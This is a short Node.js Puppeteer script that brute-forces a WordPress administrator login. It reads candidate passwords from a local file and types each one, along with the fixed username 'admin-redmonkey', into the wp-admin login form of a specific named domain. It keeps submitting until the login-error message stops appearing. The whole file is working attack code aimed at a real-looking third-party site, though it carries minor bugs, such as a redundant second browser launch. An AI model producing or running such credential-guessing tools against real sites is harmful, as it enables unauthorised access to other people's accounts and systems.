const puppeteer = require('puppeteer');
const fs = require('fs');
let data = fs.readFileSync("passwords.txt", "utf8");
data = data.replace(/(?:\r\n|\r|\n)/g, " ").split(" ");
//const username = 'admin';
let index = 0;

(async () => {
  const browser = await puppeteer.launch({
    headless: false,
    defaultViewport: null,
  });
  await puppeteer.launch({ headless: false, defaultViewport: null, });
  const page = await browser.newPage();

  await page.goto('http://agence.red-mouse.fr/wp-admin');
  await page.type('input[id="user_login"]', 'admin-redmonkey');
  await check_password(page);
})();


async function check_password (page) {
  await page.type('#user_pass', data[index]);
  await page.waitForSelector("#wp-submit");
  await page.click("#wp-submit");

  error = await page.waitForSelector("#login_error");
  if (error) {
    console.log(data[index])
    return await check_password(page,data[index++]);
  }
}
